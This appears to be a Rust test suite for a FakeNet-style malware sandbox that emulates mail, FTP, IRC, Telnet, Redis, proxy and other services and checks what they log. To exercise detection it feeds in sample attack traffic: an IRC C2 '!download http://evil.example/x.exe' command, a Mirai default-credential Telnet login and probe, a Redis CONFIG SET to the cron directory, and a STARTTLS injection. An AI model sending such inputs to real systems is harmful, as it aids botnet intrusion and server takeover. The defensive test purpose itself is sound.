//! SMTP, POP3, FTP, TFTP & IRC end to end, with the defaults and with daemon decisions

mod common;

use std::net::SocketAddr;
use std::time::Duration;

use common::{fake_daemon, listener, wait_connected, Nucleus};
use fakenet_link::LinkConfig;
use fakenet_schema::{Event, Protocol, Transport};
use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, BufReader};
use tokio::net::{TcpStream, UdpSocket};

/// A line-protocol client
struct Client<S> {
    conn: BufReader<S>,
}

impl<S: AsyncRead + AsyncWrite + Unpin> Client<S> {
    fn new(stream: S) -> Self {
        Client { conn: BufReader::new(stream) }
    }

    async fn line(&mut self) -> String {
        let mut line = String::new();
        tokio::time::timeout(Duration::from_secs(5), self.conn.read_line(&mut line)).await.unwrap().unwrap();
        line
    }

    /// A reply: SMTP/FTP multi-line ("250-...", "250 ...") or a single line
    async fn reply(&mut self) -> String {
        let mut all = String::new();
        loop {
            let line = self.line().await;
            all.push_str(&line);
            if line.len() < 4 || line.as_bytes()[3] != b'-' {
                return all;
            }
        }
    }

    /// A POP3 multi-line reply through its "." terminator
    async fn multiline(&mut self) -> String {
        let mut all = String::new();
        loop {
            let line = self.line().await;
            all.push_str(&line);
            if line == ".\r\n" || line.starts_with("-ERR") || line.is_empty() {
                return all;
            }
        }
    }

    async fn send(&mut self, line: &str) {
        self.conn.get_mut().write_all(format!("{line}\r\n").as_bytes()).await.unwrap();
    }

    async fn command(&mut self, line: &str) -> String {
        self.send(line).await;
        self.reply().await
    }
}

async fn connect(address: SocketAddr) -> Client<TcpStream> {
    Client::new(TcpStream::connect(address).await.unwrap())
}

fn mail_listeners() -> Vec<fakenet_listeners::ListenerConfig> {
    vec![
        listener("smtp", Some(Protocol::Smtp), Transport::Tcp, false),
        listener("pop3", Some(Protocol::Pop3), Transport::Tcp, false),
        listener("ftp", Some(Protocol::Ftp), Transport::Tcp, false),
        listener("irc", Some(Protocol::Irc), Transport::Tcp, false),
        listener("tftp", Some(Protocol::Tftp), Transport::Udp, false),
        listener("auto", None, Transport::Tcp, false),
    ]
}

#[tokio::test]
async fn smtp_accepts_mail_with_auth_and_starttls() {
    let nucleus = Nucleus::start("smtp", LinkConfig::default(), &mail_listeners()).await;
    let mut smtp = connect(nucleus.address("smtp")).await;
    assert!(smtp.reply().await.starts_with("220 mail.fakenet.local ESMTP"));
    let ehlo = smtp.command("EHLO bot").await;
    assert!(ehlo.contains("250-STARTTLS\r\n") && ehlo.ends_with("250 HELP\r\n"), "{ehlo}");
    assert!(smtp.command("AUTH PLAIN AGFsaWNlAHNlY3JldA==").await.starts_with("235"));
    assert!(smtp.command("AUTH LOGIN").await.starts_with("334 VXNlcm5hbWU6"));
    assert!(smtp.command("Ym9i").await.starts_with("334 UGFzc3dvcmQ6"));
    assert!(smtp.command("cGFzcw==").await.starts_with("235"));
    assert!(smtp.command("RCPT TO:<x@y>").await.starts_with("503"));
    assert!(smtp.command("DATA").await.starts_with("503"));

    // STARTTLS, with a command pipelined before the handshake (must be discarded)
    smtp.send("STARTTLS\r\nMAIL FROM:<injected@evil>").await;
    assert!(smtp.reply().await.starts_with("220"));
    let tls = nucleus.tls_connector().connect("smtp.example.com".try_into().unwrap(), smtp.conn.into_inner()).await.unwrap();
    let mut smtp = Client::new(tls);
    assert!(!smtp.command("EHLO bot").await.contains("STARTTLS"));
    assert!(smtp.command("RCPT TO:<x@y>").await.starts_with("503")); // The injected MAIL never ran
    assert!(smtp.command("MAIL FROM:<bot@evil.example>").await.starts_with("250"));
    assert!(smtp.command("RCPT TO:<victim@corp.example>").await.starts_with("250"));
    assert!(smtp.command("DATA").await.starts_with("354"));
    smtp.send("Subject: Exfil\r\n\r\nline one\r\n..leading dot\r\n.").await;
    assert!(smtp.reply().await.starts_with("250 OK queued"));
    // BUG-07: 8-bit bytes kept as sent, and a 20 KB unwrapped line accepted
    assert!(smtp.command("MAIL FROM:<bot@evil.example>").await.starts_with("250"));
    assert!(smtp.command("RCPT TO:<victim@corp.example>").await.starts_with("250"));
    assert!(smtp.command("DATA").await.starts_with("354"));
    let long = "A".repeat(20_000);
    let mut eight_bit = b"Subject: Latin-1\r\n\r\ncaf\xe9 \x82\xa0\r\n".to_vec();
    eight_bit.extend_from_slice(format!("{long}\r\n.\r\n").as_bytes());
    smtp.conn.get_mut().write_all(&eight_bit).await.unwrap();
    assert!(smtp.reply().await.starts_with("250 OK queued"));
    assert!(smtp.command("QUIT").await.starts_with("221"));

    let credentials: Vec<_> = nucleus.kinds("credentials").iter().map(|c| (c["username"].as_str().unwrap().to_string(), c["password"].as_str().unwrap().to_string())).collect();
    assert_eq!(credentials, [("alice".to_string(), "secret".to_string()), ("bob".to_string(), "pass".to_string())]);
    assert_eq!(nucleus.kinds("starttls_injection_discarded").len(), 1);
    assert_eq!(nucleus.kinds("tls_handshake")[0]["sni"], "smtp.example.com");
    let email = &nucleus.kinds("email")[0];
    assert_eq!((email["from"].as_str(), email["subject"].as_str(), email["tls"].as_bool()), (Some("bot@evil.example"), Some("Exfil"), Some(true)));
    let saved = std::fs::read_to_string(email["saved"].as_str().unwrap()).unwrap();
    assert_eq!(saved, "Subject: Exfil\r\n\r\nline one\r\n.leading dot\r\n"); // Dot-unstuffed
    let second = std::fs::read(nucleus.kinds("email")[1]["saved"].as_str().unwrap()).unwrap();
    let mut expected = b"Subject: Latin-1\r\n\r\ncaf\xe9 \x82\xa0\r\n".to_vec();
    expected.extend_from_slice(format!("{}\r\n", "A".repeat(20_000)).as_bytes());
    assert_eq!(second, expected);
    let data_event = nucleus.kinds("event").into_iter().find(|e| e["meta"]["command"] == "MESSAGE").unwrap();
    assert_eq!(data_event["meta"]["to"][0], "victim@corp.example");
}

/// Scripted answers for the mail, FTP & IRC tests, like an analyst's Camel rules
fn scripted(event: &Event) -> Option<(Vec<u8>, bool)> {
    let meta = &event.meta;
    let command = meta["command"].as_str().unwrap_or("");
    match (event.protocol, command) {
        (Protocol::Pop3, "RETR") if meta["argument"] == "1" => Some((b"+OK\r\nSubject: Your invoice\r\n\r\nSee attached.\r\n.\r\n".to_vec(), false)),
        (Protocol::Smtp, "MESSAGE") => Some((b"250 2.0.0 Ok: queued as C2C2C2\r\n".to_vec(), false)),
        (Protocol::Ftp, "RETR") => Some((format!("payload for {}", meta["path"].as_str().unwrap()).into_bytes(), false)),
        (Protocol::Irc, "JOIN") => Some((b":boss!b@c2 PRIVMSG #bots :!download http://evil.example/x.exe\r\n".to_vec(), false)),
        (Protocol::Tftp, _) => Some((b"tftp payload".to_vec(), false)),
        _ => None,
    }
}

#[tokio::test]
async fn pop3_and_smtp_follow_the_daemon() {
    let nucleus = Nucleus::start("pop3", fake_daemon(Duration::ZERO, scripted).await, &mail_listeners()).await;
    wait_connected().await;
    let mut pop3 = connect(nucleus.address("pop3")).await;
    assert!(pop3.line().await.starts_with("+OK"));
    assert!(pop3.command("USER alice").await.starts_with("+OK"));
    assert!(pop3.command("PASS hunter2").await.starts_with("+OK"));
    pop3.send("LIST").await;
    assert_eq!(pop3.multiline().await.lines().count(), 3); // Default
    pop3.send("RETR 1").await;
    assert!(pop3.multiline().await.contains("Subject: Your invoice")); // Scripted
    assert!(pop3.command("RETR 9").await.starts_with("-ERR")); // Default (no daemon answer)
    assert!(pop3.command("QUIT").await.starts_with("+OK"));
    assert_eq!(nucleus.kinds("credentials")[0]["password"], "hunter2");

    let mut smtp = connect(nucleus.address("smtp")).await;
    smtp.reply().await;
    for command in ["HELO bot", "MAIL FROM:<a@b>", "RCPT TO:<c@d>", "DATA"] {
        smtp.command(command).await;
    }
    smtp.send("hello\r\n.").await;
    assert_eq!(smtp.reply().await, "250 2.0.0 Ok: queued as C2C2C2\r\n");
}

/// FTP data connection for a passive reply "227 ... (h1,h2,h3,h4,p1,p2)"
async fn passive_data(reply: &str) -> TcpStream {
    let numbers: Vec<u16> = reply[reply.find('(').unwrap() + 1..reply.find(')').unwrap()].split(',').map(|n| n.parse().unwrap()).collect();
    let address = SocketAddr::from(([numbers[0] as u8, numbers[1] as u8, numbers[2] as u8, numbers[3] as u8], numbers[4] << 8 | numbers[5]));
    TcpStream::connect(address).await.unwrap()
}

#[tokio::test]
async fn ftp_serves_daemon_files_and_saves_uploads() {
    let nucleus = Nucleus::start("ftp", fake_daemon(Duration::ZERO, scripted).await, &mail_listeners()).await;
    wait_connected().await;
    let mut ftp = connect(nucleus.address("ftp")).await;
    assert!(ftp.reply().await.starts_with("220 FTP Server Ready"));
    assert!(ftp.command("USER anonymous").await.starts_with("331"));
    assert!(ftp.command("PASS bot@").await.starts_with("230"));
    assert!(ftp.command("CWD /stage2").await.starts_with("250"));

    // Download: the daemon supplies the content
    let mut data = passive_data(&ftp.command("PASV").await).await;
    assert!(ftp.command("RETR implant.bin").await.starts_with("150"));
    let mut contents = String::new();
    data.read_to_string(&mut contents).await.unwrap();
    assert_eq!(contents, "payload for /stage2/implant.bin");
    assert!(ftp.reply().await.starts_with("226"));

    // Upload: saved, and given to the daemon (which leaves the reply alone)
    let mut data = TcpStream::connect(match ftp.command("EPSV").await.split("|||").nth(1) {
        Some(rest) => SocketAddr::from(([127, 0, 0, 1], rest.trim_end_matches(|c| c == '|' || c == ')' || c == '\r' || c == '\n').parse().unwrap())),
        None => panic!("no EPSV port"),
    }).await.unwrap();
    assert!(ftp.command("STOR loot.zip").await.starts_with("150"));
    data.write_all(b"PK\x03\x04stolen").await.unwrap();
    drop(data);
    assert!(ftp.reply().await.starts_with("226"));
    // Active mode to anyone but the client is refused (no FTP bounce)
    assert!(ftp.command("PORT 10,0,0,9,4,1").await.starts_with("504"));
    assert!(ftp.command("QUIT").await.starts_with("221"));

    let upload = &nucleus.kinds("upload")[0];
    assert_eq!(std::fs::read(upload["saved"].as_str().unwrap()).unwrap(), b"PK\x03\x04stolen");
    assert_eq!(nucleus.kinds("download")[0]["path"], "/stage2/implant.bin");

    // FTP on a port that isn't 21: sniffed by the auto listener
    let mut auto = connect(nucleus.address("auto")).await;
    auto.send("USER anonymous").await;
    assert!(auto.reply().await.starts_with("220")); // Its greeting, then...
    assert!(auto.reply().await.starts_with("331")); // ...the replayed USER's reply
}

#[tokio::test]
async fn tftp_transfers_both_ways() {
    let nucleus = Nucleus::start("tftp", fake_daemon(Duration::ZERO, scripted).await, &mail_listeners()).await;
    wait_connected().await;
    let socket = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    let mut buffer = [0u8; 1024];

    // Download: DATA comes from a new port (the transfer ID); ACK it there
    socket.send_to(b"\x00\x01boot.cfg\x00octet\x00", nucleus.address("tftp")).await.unwrap();
    let (length, tid) = tokio::time::timeout(Duration::from_secs(5), socket.recv_from(&mut buffer)).await.unwrap().unwrap();
    assert_ne!(tid, nucleus.address("tftp"));
    assert_eq!(&buffer[..length], b"\x00\x03\x00\x01tftp payload");
    socket.send_to(b"\x00\x04\x00\x01", tid).await.unwrap();

    // Upload
    socket.send_to(b"\x00\x02exfil.txt\x00octet\x00", nucleus.address("tftp")).await.unwrap();
    let (length, tid) = tokio::time::timeout(Duration::from_secs(5), socket.recv_from(&mut buffer)).await.unwrap().unwrap();
    assert_eq!(&buffer[..length], b"\x00\x04\x00\x00");
    socket.send_to(b"\x00\x03\x00\x01secrets", tid).await.unwrap();
    let (length, _) = tokio::time::timeout(Duration::from_secs(5), socket.recv_from(&mut buffer)).await.unwrap().unwrap();
    assert_eq!(&buffer[..length], b"\x00\x04\x00\x01");

    tokio::time::sleep(Duration::from_millis(200)).await;
    let upload = &nucleus.kinds("upload")[0];
    assert_eq!(upload["filename"], "exfil.txt");
    assert_eq!(std::fs::read(upload["saved"].as_str().unwrap()).unwrap(), b"secrets");
    assert_eq!(nucleus.kinds("download")[0]["size"], 12);
}

#[tokio::test]
async fn irc_registers_bots_and_relays_scripted_commands() {
    let nucleus = Nucleus::start("irc", fake_daemon(Duration::ZERO, scripted).await, &mail_listeners()).await;
    wait_connected().await;
    let mut irc = connect(nucleus.address("irc")).await;
    irc.send("NICK bot42").await;
    irc.send("USER bot 0 * :Bot").await;
    let welcome = irc.line().await;
    assert!(welcome.contains(" 001 bot42 "), "{welcome}");
    for _ in 0..6 {
        irc.line().await; // Rest of the welcome & MOTD
    }
    irc.send("JOIN #bots secretkey").await;
    assert_eq!(irc.line().await, ":boss!b@c2 PRIVMSG #bots :!download http://evil.example/x.exe\r\n");
    irc.send("PING :x").await;
    assert!(irc.line().await.contains("PONG"));

    let join = &nucleus.kinds("join")[0];
    assert_eq!((join["channels"].as_str(), join["keys"].as_str()), (Some("#bots"), Some("secretkey")));
    let join_event = nucleus.kinds("event").into_iter().find(|e| e["meta"]["command"] == "JOIN").unwrap();
    assert_eq!(join_event["meta"]["nick"], "bot42");
}

fn ported_listeners() -> Vec<fakenet_listeners::ListenerConfig> {
    vec![
        listener("imap", Some(Protocol::Imap), Transport::Tcp, false),
        listener("ssh", Some(Protocol::Ssh), Transport::Tcp, false),
        listener("telnet", Some(Protocol::Telnet), Transport::Tcp, false),
        listener("redis", Some(Protocol::Redis), Transport::Tcp, false),
        listener("ntp", Some(Protocol::Ntp), Transport::Udp, false),
        listener("http", Some(Protocol::Http), Transport::Tcp, false),
        listener("auto", None, Transport::Tcp, false),
    ]
}

/// Like an analyst's rules for the ported protocols
fn ported_rules(event: &Event) -> Option<(Vec<u8>, bool)> {
    match (event.protocol, event.meta["command"].as_str()) {
        (Protocol::Ntp, _) => Some((b"+86400".to_vec(), false)),
        (Protocol::Telnet, Some(command)) if command.starts_with("cat /proc/cpuinfo") => Some((b"model name : ARMv7\r\n# ".to_vec(), false)),
        (Protocol::Http, _) if event.meta["method"] == "CONNECT" && event.meta["host"] == "blocked.example:443" => {
            Some((b"HTTP/1.1 403 Forbidden\r\n\r\n".to_vec(), false))
        }
        _ => None,
    }
}

#[tokio::test]
async fn imap_ssh_telnet_and_redis_honeypots() {
    let nucleus = Nucleus::start("ported", fake_daemon(Duration::ZERO, ported_rules).await, &ported_listeners()).await;
    wait_connected().await;

    let mut imap = connect(nucleus.address("imap")).await;
    assert!(imap.line().await.starts_with("* OK [CAPABILITY"));
    assert_eq!(imap.command("a1 LOGIN \"alice\" \"s3cret\"").await, "a1 OK LOGIN completed\r\n");
    // Literals (BUG-17): a synchronizing one gets a continuation, a non-synchronizing one doesn't
    assert_eq!(imap.command("a1b LOGIN {3}").await, "+ Ready for literal data\r\n");
    imap.send("bob {7+}\r\np\"ss wd").await;
    assert_eq!(imap.line().await, "a1b OK LOGIN completed\r\n");
    imap.send("a2 SELECT INBOX").await;
    let mut select = String::new();
    while !select.contains("a2 OK") {
        select.push_str(&imap.line().await);
    }
    imap.send("a3 FETCH 1 (BODY.PEEK[])").await;
    let mut fetch = String::new();
    while !fetch.contains("a3 OK") {
        fetch.push_str(&imap.line().await);
    }
    assert!(fetch.contains("FakeNet message body"), "{fetch}");

    // SSH: the version exchange and key exchange offer, fingerprinted
    let mut ssh = TcpStream::connect(nucleus.address("ssh")).await.unwrap();
    ssh.write_all(b"SSH-2.0-Go\r\n").await.unwrap();
    let mut payload = vec![20u8];
    payload.extend([0u8; 16]);
    for list in ["curve25519-sha256", "ssh-ed25519", "aes128-gcm@openssh.com", "aes128-gcm@openssh.com", "hmac-sha2-256", "hmac-sha2-256", "none", "none", "", ""] {
        payload.extend((list.len() as u32).to_be_bytes());
        payload.extend(list.as_bytes());
    }
    payload.extend([0u8; 5]);
    let padding = 8 - (payload.len() + 5) % 8 + 4;
    let mut packet = ((payload.len() + padding + 1) as u32).to_be_bytes().to_vec();
    packet.push(padding as u8);
    packet.extend(&payload);
    packet.extend(vec![0u8; padding]);
    ssh.write_all(&packet).await.unwrap();
    let mut banner = vec![0u8; 64];
    let read = ssh.read(&mut banner).await.unwrap();
    assert!(banner[..read].starts_with(b"SSH-2.0-OpenSSH_8.9p1"));

    // Telnet: a Mirai-style login & probe, plus a daemon-scripted answer
    let mut telnet = connect(nucleus.address("telnet")).await;
    let mut prompt = vec![0u8; 3];
    telnet.conn.read_exact(&mut prompt).await.unwrap(); // IAC WILL SGA
    assert_eq!(prompt, [255, 251, 3]);
    telnet.line().await;
    telnet.line().await; // Banner
    telnet.send("root").await;
    telnet.send("xc3511").await;
    let mut welcome = vec![0u8; 64];
    let read = telnet.conn.read(&mut welcome).await.unwrap();
    let mut text = String::from_utf8_lossy(&welcome[..read]).into_owned();
    while !text.contains("# ") {
        let read = telnet.conn.read(&mut welcome).await.unwrap();
        text.push_str(&String::from_utf8_lossy(&welcome[..read]));
    }
    telnet.send("/bin/busybox MIRAI").await;
    assert_eq!(telnet.line().await, "MIRAI: applet not found\r\n");
    telnet.send("cat /proc/cpuinfo").await;
    let mut cpu = vec![0u8; 64];
    let mut output = String::new();
    while !output.contains("ARMv7") {
        let read = telnet.conn.read(&mut cpu).await.unwrap();
        output.push_str(&String::from_utf8_lossy(&cpu[..read]));
    }

    // Redis: RESP, credentials, and a flagged CONFIG SET
    let mut redis = connect(nucleus.address("redis")).await;
    redis.send("*2\r\n$4\r\nAUTH\r\n$6\r\nfoobar").await;
    assert_eq!(redis.line().await, "+OK\r\n");
    redis.send("*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/").await;
    assert_eq!(redis.line().await, "+OK\r\n");
    redis.send("PING").await;
    assert_eq!(redis.line().await, "+PONG\r\n");

    tokio::time::sleep(Duration::from_millis(100)).await;
    let credentials: Vec<_> = nucleus.kinds("credentials").iter().map(|c| (c["protocol"].as_str().unwrap().to_string(), c["password"].as_str().unwrap().to_string())).collect();
    assert!(credentials.contains(&("imap".into(), "s3cret".into())), "{credentials:?}");
    assert!(nucleus.kinds("credentials").iter().any(|c| c["username"] == "bob" && c["password"] == "p\"ss wd"), "IMAP literals");
    assert!(credentials.contains(&("telnet".into(), "xc3511".into())), "{credentials:?}");
    assert!(credentials.contains(&("redis".into(), "foobar".into())), "{credentials:?}");
    let ssh_client = &nucleus.kinds("ssh_client")[0];
    assert_eq!(ssh_client["version"], "SSH-2.0-Go");
    assert_eq!(ssh_client["hassh"].as_str().unwrap().len(), 32);
    assert_eq!(nucleus.kinds("suspicious_command")[0]["command"], "CONFIG");
}

#[tokio::test]
async fn ntp_serves_the_daemons_time_offset() {
    let nucleus = Nucleus::start("ntp", fake_daemon(Duration::ZERO, ported_rules).await, &ported_listeners()).await;
    wait_connected().await;
    let socket = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    let mut request = vec![0u8; 48];
    request[0] = 0x23;
    socket.send_to(&request, nucleus.address("ntp")).await.unwrap();
    let mut reply = [0u8; 48];
    tokio::time::timeout(Duration::from_secs(5), socket.recv(&mut reply)).await.unwrap().unwrap();
    let served = u32::from_be_bytes(reply[40..44].try_into().unwrap()) as i64 - 2_208_988_800;
    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() as i64;
    assert!((served - now - 86_400).abs() < 5, "served {served}, now {now}");
}

#[tokio::test]
async fn proxies_connect_tunnels_and_tls_without_sni() {
    let nucleus = Nucleus::start("proxy", fake_daemon(Duration::ZERO, ported_rules).await, &ported_listeners()).await;
    wait_connected().await;

    // A proxy-aware client tunnels TLS through CONNECT; the inner session is sniffed,
    // decrypted with a certificate for the tunnel's host, and answered as HTTP
    let mut proxy = TcpStream::connect(nucleus.address("http")).await.unwrap();
    proxy.write_all(b"CONNECT c2.example:443 HTTP/1.1\r\nHost: c2.example:443\r\n\r\n").await.unwrap();
    let mut established = vec![0u8; 512];
    let read = proxy.read(&mut established).await.unwrap();
    assert!(established[..read].starts_with(b"HTTP/1.1 200"), "{}", String::from_utf8_lossy(&established[..read]));
    let tls = nucleus.tls_connector().connect("c2.example".try_into().unwrap(), proxy).await.unwrap();
    let mut client = Client::new(tls);
    client.send("GET /tunnelled HTTP/1.1\r\nHost: c2.example\r\nConnection: close\r\n").await;
    let mut page = String::new();
    client.conn.read_to_string(&mut page).await.unwrap();
    assert!(page.starts_with("HTTP/1.1 200") && page.contains("FakeNet"), "{page}");

    // The daemon can refuse a tunnel
    let mut proxy = TcpStream::connect(nucleus.address("http")).await.unwrap();
    proxy.write_all(b"CONNECT blocked.example:443 HTTP/1.1\r\n\r\n").await.unwrap();
    let read = proxy.read(&mut established).await.unwrap();
    assert!(established[..read].starts_with(b"HTTP/1.1 403"));

    // TLS to a bare IP (no SNI): the certificate names the IP, so verification passes
    let tcp = TcpStream::connect(nucleus.address("auto")).await.unwrap();
    let ip = rustls::pki_types::ServerName::IpAddress(std::net::IpAddr::from([127, 0, 0, 1]).into());
    let tls = nucleus.tls_connector().connect(ip, tcp).await.unwrap();
    let mut client = Client::new(tls);
    client.send("GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n").await;
    let mut page = String::new();
    client.conn.read_to_string(&mut page).await.unwrap();
    assert!(page.starts_with("HTTP/1.1 200"));

    let tunnel = &nucleus.kinds("proxy_tunnel")[0];
    assert_eq!(tunnel["target"], "c2.example:443");
    assert_eq!(tunnel["dst"].as_str().unwrap().split(':').next_back(), Some("443"));
    let handshakes = nucleus.kinds("tls_handshake");
    assert!(handshakes.iter().any(|h| h["certificate"] == "c2.example"));
    assert!(handshakes.iter().any(|h| h["sni"].is_null() && h["certificate"] == "127.0.0.1"));
}

fn custom_listeners() -> Vec<fakenet_listeners::ListenerConfig> {
    let custom = Some(std::path::PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/custom/custom.ini")));
    let with_custom = |name: &str, protocol, transport| fakenet_listeners::ListenerConfig { custom: custom.clone(), ..listener(name, Some(protocol), transport, false) };
    vec![
        with_custom("HTTPCustom", Protocol::Http, Transport::Tcp),
        with_custom("RawTCPDynamic", Protocol::Raw, Transport::Tcp),
        with_custom("RawTCPStatic", Protocol::Raw, Transport::Tcp),
        with_custom("RawUDPDynamic", Protocol::Raw, Transport::Udp),
        with_custom("RawUDPStatic", Protocol::Raw, Transport::Udp),
        fakenet_listeners::ListenerConfig { process_blacklist: vec![std::fs::read_to_string("/proc/self/comm").unwrap_or_default().trim().to_string()], ..listener("filtered", Some(Protocol::Raw), Transport::Tcp, false) },
    ]
}

async fn udp_exchange(address: SocketAddr, data: &[u8]) -> Vec<u8> {
    let socket = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    socket.send_to(data, address).await.unwrap();
    let mut buffer = [0u8; 512];
    let length = tokio::time::timeout(Duration::from_secs(10), socket.recv(&mut buffer)).await.unwrap().unwrap();
    buffer[..length].to_vec()
}

/// The daemon overrides custom responses: here, for one path only
fn override_one(event: &Event) -> Option<(Vec<u8>, bool)> {
    (event.meta["path"] == "/static.txt?daemon").then(|| (b"HTTP/1.1 200 OK\r\n\r\nfrom the daemon".to_vec(), false))
}

#[tokio::test]
async fn serves_fakenet_ng_custom_responses() {
    let nucleus = Nucleus::start("custom", fake_daemon(Duration::ZERO, override_one).await, &custom_listeners()).await;
    wait_connected().await;
    let http = nucleus.address("HTTPCustom");
    let get = |host: &'static str, path: &'static str| async move {
        let mut stream = TcpStream::connect(http).await.unwrap();
        stream.write_all(format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").as_bytes()).await.unwrap();
        let mut response = String::new();
        stream.read_to_string(&mut response).await.unwrap();
        response
    };
    let static_page = get("any.example", "/static.txt").await;
    assert!(static_page.contains("content-type: text/plain") && static_page.contains("Static body (") && !static_page.contains("<RAW-DATE>"), "{static_page}");
    let raw = get("raw.c2.example", "/").await;
    let expected_body = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/custom/sample_raw_response.txt")).unwrap();
    assert!(raw.ends_with(expected_body.split_once("\n\n").map(|(_, b)| b).unwrap_or(&expected_body)), "{raw}");
    assert!(get("dynamic.c2.example", "/gate").await.starts_with("HTTP/1.1 200"));
    assert!(get("any.example", "/static.txt?daemon").await.ends_with("from the daemon"));

    if cfg!(unix) {
        let mut tcp = TcpStream::connect(nucleus.address("RawTCPDynamic")).await.unwrap();
        tcp.write_all(b"hello").await.unwrap();
        let mut reply = vec![0u8; 64];
        let read = tokio::time::timeout(Duration::from_secs(10), tcp.read(&mut reply)).await.unwrap().unwrap();
        assert_eq!(&reply[..read], b"PROVIDER:HELLO");
        assert_eq!(udp_exchange(nucleus.address("RawUDPDynamic"), b"ping").await, b"PROVIDER:PING");
    }
    let mut tcp = TcpStream::connect(nucleus.address("RawTCPStatic")).await.unwrap();
    tcp.write_all(b"anything").await.unwrap();
    let mut reply = vec![0u8; 64];
    let read = tcp.read(&mut reply).await.unwrap();
    assert_eq!(&reply[..read], b"OK\n");
    assert_eq!(udp_exchange(nucleus.address("RawUDPStatic"), b"x").await, b"static-reply");

    // This test process is on the filtered listener's blacklist: closed without a reply
    let mut filtered = TcpStream::connect(nucleus.address("filtered")).await.unwrap();
    let _ = filtered.write_all(b"hello").await;
    let mut nothing = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(5), filtered.read_to_end(&mut nothing)).await;
    assert!(nothing.is_empty());
    tokio::time::sleep(Duration::from_millis(100)).await;
    assert_eq!(nucleus.kinds("filtered")[0]["reason"], "process in process_blacklist");
}

fn refuse_blocked(event: &Event) -> Option<(Vec<u8>, bool)> {
    match event.protocol {
        Protocol::Socks if event.meta["host"] == "blocked.example" => Some((Vec::new(), true)),
        Protocol::Whois => Some((b"Domain Name: SCRIPTED\r\n".to_vec(), false)),
        _ => None,
    }
}

#[tokio::test]
async fn socks_syslog_and_small_services() {
    let listeners = vec![
        listener("socks", Some(Protocol::Socks), Transport::Tcp, false),
        listener("syslog", Some(Protocol::Syslog), Transport::Udp, false),
        listener("syslog-tcp", Some(Protocol::Syslog), Transport::Tcp, false),
        listener("finger", Some(Protocol::Finger), Transport::Tcp, false),
        listener("whois", Some(Protocol::Whois), Transport::Tcp, false),
        listener("daytime", Some(Protocol::Daytime), Transport::Tcp, false),
    ];
    let nucleus = Nucleus::start("socks", fake_daemon(Duration::ZERO, refuse_blocked).await, &listeners).await;
    wait_connected().await;

    // SOCKS5 with username/password, tunnelling HTTP to a hostname
    let mut socks = TcpStream::connect(nucleus.address("socks")).await.unwrap();
    socks.write_all(&[5, 1, 2]).await.unwrap();
    let mut reply = [0u8; 2];
    socks.read_exact(&mut reply).await.unwrap();
    assert_eq!(reply, [5, 2]);
    socks.write_all(&[1, 3, b'b', b'o', b't', 2, b'p', b'w']).await.unwrap();
    socks.read_exact(&mut reply).await.unwrap();
    assert_eq!(reply, [1, 0]);
    let mut request = vec![5, 1, 0, 3, 10];
    request.extend(b"c2.example");
    request.extend(80u16.to_be_bytes());
    socks.write_all(&request).await.unwrap();
    let mut connected = [0u8; 10];
    socks.read_exact(&mut connected).await.unwrap();
    assert_eq!(connected[..2], [5, 0]);
    socks.write_all(b"GET /via-socks HTTP/1.1\r\nHost: c2.example\r\nConnection: close\r\n\r\n").await.unwrap();
    let mut page = String::new();
    socks.read_to_string(&mut page).await.unwrap();
    assert!(page.starts_with("HTTP/1.1 200"), "{page}");

    // SOCKS4a, refused by the daemon
    let mut socks4 = TcpStream::connect(nucleus.address("socks")).await.unwrap();
    let mut request = vec![4, 1, 0, 80, 0, 0, 0, 1];
    request.extend(b"user\0blocked.example\0");
    socks4.write_all(&request).await.unwrap();
    let mut reply = [0u8; 8];
    socks4.read_exact(&mut reply).await.unwrap();
    assert_eq!(reply[1], 0x5b);

    // Syslog over UDP & TCP (octet-counted): logged, never answered
    let udp = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    udp.send_to(b"<34>Oct 11 22:14:15 bot su: 'su root' failed", nucleus.address("syslog")).await.unwrap();
    let mut tcp = TcpStream::connect(nucleus.address("syslog-tcp")).await.unwrap();
    tcp.write_all(b"48 <165>1 2026-10-16T00:00:00Z bot app - - - beacon").await.unwrap();
    drop(tcp);

    // Finger, whois (scripted by the daemon), daytime
    let mut finger = connect(nucleus.address("finger")).await;
    finger.send("root").await;
    assert!(finger.line().await.starts_with("Login: root"));
    let mut whois = connect(nucleus.address("whois")).await;
    whois.send("evil.example").await;
    assert_eq!(whois.line().await, "Domain Name: SCRIPTED\r\n");
    let mut daytime = connect(nucleus.address("daytime")).await;
    assert!(daytime.line().await.ends_with("-UTC\r\n"));

    tokio::time::sleep(Duration::from_millis(300)).await;
    let tunnel = &nucleus.kinds("proxy_tunnel")[0];
    assert_eq!(tunnel["target"], "c2.example:80");
    assert_eq!(nucleus.kinds("credentials")[0]["username"], "bot");
    assert_eq!(nucleus.kinds("socks_refused")[0]["target"], "blocked.example:80");
    let messages: Vec<_> = nucleus.kinds("syslog_message").iter().map(|m| m["severity"].as_str().unwrap_or("").to_string()).collect();
    assert_eq!(messages, ["critical", "notice"]);
}

#[tokio::test]
async fn fingerprints_a_real_openssh_client() {
    let nucleus = Nucleus::start("openssh", LinkConfig::default(), &[listener("ssh", Some(Protocol::Ssh), Transport::Tcp, false)]).await;
    let mut ssh = TcpStream::connect(nucleus.address("ssh")).await.unwrap();
    // Captured from OpenSSH 10.4: its version line and first key exchange packet
    ssh.write_all(include_bytes!("fixtures/ssh/openssh-10.4-client-hello.bin")).await.unwrap();
    let mut banner = vec![0u8; 64];
    let _ = ssh.read(&mut banner).await.unwrap();
    tokio::time::sleep(Duration::from_millis(300)).await;
    let client = &nucleus.kinds("ssh_client")[0];
    assert_eq!(client["version"], "SSH-2.0-OpenSSH_10.4p1 Debian-5");
    assert_eq!(client["hassh"].as_str().unwrap().len(), 32);
    let event = nucleus.kinds("event").into_iter().find(|e| e["protocol"] == "ssh").unwrap();
    assert!(event["meta"]["kexinit"]["kex"].as_str().unwrap().contains("curve25519-sha256"), "{event}");
}

